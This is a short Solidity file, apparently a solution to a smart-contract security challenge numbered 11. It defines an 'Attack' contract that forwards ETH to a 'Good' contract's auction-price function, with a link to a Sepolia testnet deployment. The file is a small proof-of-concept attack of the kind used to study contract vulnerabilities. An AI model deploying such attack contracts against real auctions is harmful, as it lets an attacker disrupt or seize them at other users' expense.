// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "./challange#11_Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}

// https://sepolia.etherscan.io/address/0x905af90f5561a8080878c2e93459d932d8906b59#code